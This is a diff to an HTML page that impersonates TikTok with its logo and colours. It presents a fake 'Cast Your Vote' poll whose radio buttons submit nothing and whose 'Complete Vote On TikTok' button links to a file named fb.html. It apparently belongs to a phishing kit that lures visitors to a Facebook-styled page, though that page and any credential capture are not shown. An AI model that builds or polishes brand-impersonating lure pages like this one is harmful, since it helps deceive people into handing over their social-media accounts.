@@ -6,178 +6,162 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
 <style>
-  :root {
-    --cyan: #25f4ee;
-    --pink: #fe2c55;
-    --bg: #000;
-    --card: rgba(255,255,255,0.05);
-    --border: rgba(255,255,255,0.12);
-  }
-
-  * {
-    box-sizing: border-box;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
-      Roboto, Helvetica, Arial, sans-serif;
-  }
-
-  body {
-    margin: 0;
-    min-height: 100vh;
-    background:
-      radial-gradient(circle at top left, rgba(37,244,238,0.15), transparent 40%),
-      radial-gradient(circle at bottom right, rgba(254,44,85,0.15), transparent 40%),
-      var(--bg);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
-    overflow: hidden;
-  }
-
-  .card {
-    width: 100%;
-    max-width: 440px;
-    padding: 34px 26px;
-    border-radius: 22px;
-    background: var(--card);
-    backdrop-filter: blur(14px);
-    border: 1px solid var(--border);
-    box-shadow: 0 40px 80px rgba(0,0,0,0.9);
-    animation: floatIn 0.9s ease;
-  }
-
-  @keyframes floatIn {
-    from {
-      opacity: 0;
-      transform: translateY(30px) scale(0.96);
-    }
-    to {
-      opacity: 1;
-      transform: translateY(0) scale(1);
-    }
-  }
-
-  .logo {
-    text-align: center;
-    font-weight: 900;
-    font-size: 22px;
-    margin-bottom: 18px;
-    background: linear-gradient(135deg, var(--cyan), var(--pink));
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    letter-spacing: 0.5px;
-  }
-
-  h1 {
-    text-align: center;
-    font-size: 24px;
-    margin-bottom: 10px;
-  }
-
-  .subtitle {
-    text-align: center;
-    font-size: 15px;
-    color: #cfcfcf;
-    line-height: 1.5;
-    margin-bottom: 28px;
-  }
-
-  .vote-options {
-    display: grid;
-    gap: 16px;
-    margin-bottom: 26px;
-  }
-
-  .option {
-    position: relative;
-    padding: 18px;
-    border-radius: 16px;
-    border: 1px solid var(--border);
-    cursor: pointer;
-    overflow: hidden;
-    transition: transform 0.2s ease, border 0.2s ease;
-  }
-
-  .option::before {
-    content: "";
-    position: absolute;
-    inset: 0;
-    background: linear-gradient(135deg, var(--cyan), var(--pink));
-    opacity: 0;
-    transition: opacity 0.3s ease;
-    z-index: 0;
-  }
-
-  .option span {
-    position: relative;
-    z-index: 1;
-    font-size: 16px;
-    font-weight: 600;
-  }
-
-  .option:hover {
-    transform: scale(1.02);
-    border-color: transparent;
-  }
-
-  .option:hover::before {
-    opacity: 0.15;
-  }
-
-  .option input {
-    display: none;
-  }
-
-  .option input:checked + span {
-    color: #000;
-  }
-
-  .option input:checked ~ ::before {
-    opacity: 1;
-  }
-
-  .option.selected::before {
-    opacity: 1;
-  }
-
-  .submit {
-    width: 100%;
-    border: none;
-    padding: 15px;
-    border-radius: 18px;
-    font-size: 16px;
-    font-weight: 800;
-    cursor: pointer;
-    background: linear-gradient(135deg, var(--cyan), var(--pink));
-    color: #000;
-    transition: transform 0.2s ease, box-shadow 0.2s ease;
-  }
-
-  .submit:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 10px 30px rgba(254,44,85,0.35);
-  }
-
-  .note {
-    margin-top: 18px;
-    text-align: center;
-    font-size: 12.5px;
-    color: #9a9a9a;
-  }
-</style>
-  <div id="google_translate_element"></div>
-
-<script type="text/javascript">
-function googleTranslateElementInit() {
-  new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
+:root {
+  --cyan: #25f4ee;
+  --pink: #fe2c55;
+  --bg: #000;
+  --card: rgba(255,255,255,0.05);
+  --border: rgba(255,255,255,0.12);
 }
-</script>
 
-<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+* {
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+    Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  background:
+    radial-gradient(circle at top left, rgba(37,244,238,0.15), transparent 40%),
+    radial-gradient(circle at bottom right, rgba(254,44,85,0.15), transparent 40%),
+    var(--bg);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #fff;
+}
+
+/* CARD */
+.card {
+  width: 100%;
+  max-width: 440px;
+  padding: 26px;
+  border-radius: 22px;
+  background: var(--card);
+  backdrop-filter: blur(14px);
+  border: 1px solid var(--border);
+  box-shadow: 0 40px 80px rgba(0,0,0,0.9);
+}
+
+/* TRANSLATE */
+.translate-wrapper {
+  display: flex;
+  justify-content: flex-end;
+  margin-bottom: 12px;
+}
+
+#google_translate_element {
+  background: rgba(0,0,0,0.4);
+  border-radius: 10px;
+  padding: 4px 6px;
+}
+
+.goog-te-gadget {
+  color: #fff !important;
+  font-size: 12px;
+}
+
+.goog-te-combo {
+  background: transparent;
+  color: #fff;
+  border: 1px solid rgba(255,255,255,0.2);
+  border-radius: 6px;
+  padding: 4px;
+}
+
+/* LOGO */
+.logo {
+  text-align: center;
+  font-weight: 900;
+  font-size: 22px;
+  margin-bottom: 18px;
+  background: linear-gradient(135deg, var(--cyan), var(--pink));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+h1 {
+  text-align: center;
+  font-size: 24px;
+  margin-bottom: 10px;
+}
+
+.subtitle {
+  text-align: center;
+  font-size: 15px;
+  color: #cfcfcf;
+  margin-bottom: 28px;
+}
+
+/* OPTIONS */
+.vote-options {
+  display: grid;
+  gap: 16px;
+  margin-bottom: 26px;
+}
+
+.option {
+  position: relative;
+  padding: 18px;
+  border-radius: 16px;
+  border: 1px solid var(--border);
+  cursor: pointer;
+}
+
+.option input {
+  display: none;
+}
+
+.option span {
+  font-size: 16px;
+  font-weight: 600;
+}
+
+/* BUTTON */
+.submit {
+  width: 100%;
+  border: none;
+  padding: 15px;
+  border-radius: 18px;
+  font-size: 16px;
+  font-weight: 800;
+  cursor: pointer;
+  background: linear-gradient(135deg, var(--cyan), var(--pink));
+  color: #000;
+}
+
+.note {
+  margin-top: 18px;
+  text-align: center;
+  font-size: 12.5px;
+  color: #9a9a9a;
+}
+
+/* MOBILE */
+@media (max-width: 480px) {
+  .card {
+    margin: 16px;
+    padding: 22px;
+  }
+
+  .translate-wrapper {
+    justify-content: center;
+  }
+}
+</style>
+
 </head>
 <body>
 
 <div class="card">
+
+  <!-- TRANSLATE -->
+  <div class="translate-wrapper">
+    <div id="google_translate_element"></div>
+  </div>
+
   <div class="logo">♪ TikTok</div>
 
   <h1>Cast Your Vote</h1>
@@ -187,24 +171,36 @@ function googleTranslateElementInit() {
 
   <div class="vote-options">
     <label class="option">
-      <input type="radio" name="vote" />
+      <input type="radio" name="vote">
       <span>👍 Yes, I support this</span>
     </label>
 
     <label class="option">
-      <input type="radio" name="vote" />
+      <input type="radio" name="vote">
       <span>👎 No, I don’t agree</span>
     </label>
   </div>
 
-<a href="fb.html"><button class="submit"> Complete Vote On TIKTOK</button></a>
+  <a href="fb.html">
+    <button class="submit">Complete Vote On TikTok</button>
+  </a>
 
   <div class="note">
     Voting is anonymous • Results update in real time
   </div>
+
 </div>
+
+<!-- GOOGLE TRANSLATE SCRIPT -->
+<script>
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement(
+    { pageLanguage: 'en' },
+    'google_translate_element'
+  );
+}
+</script>
+<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
 </body>
 </html>
-
-
